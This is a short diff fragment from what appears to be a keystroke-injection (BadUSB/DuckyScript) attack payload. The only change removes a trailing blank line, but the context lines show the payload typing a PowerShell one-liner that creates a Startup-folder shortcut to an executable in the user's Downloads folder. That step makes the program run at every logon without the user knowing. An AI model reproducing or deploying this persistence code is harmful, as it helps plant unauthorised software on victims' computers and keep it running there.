@@ -33,4 +33,3 @@ ENTER
 REM Add to startup REMOVE FOR TESTING
 STRING $sc="$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\MyApp.lnk";$tg="$env:USERPROFILE\Downloads\main.exe";$sh=New-Object -ComObject WScript.Shell;$s=$sh.CreateShortcut($sc);$s.TargetPath=$tg;$s.Save()
 ENTER
-
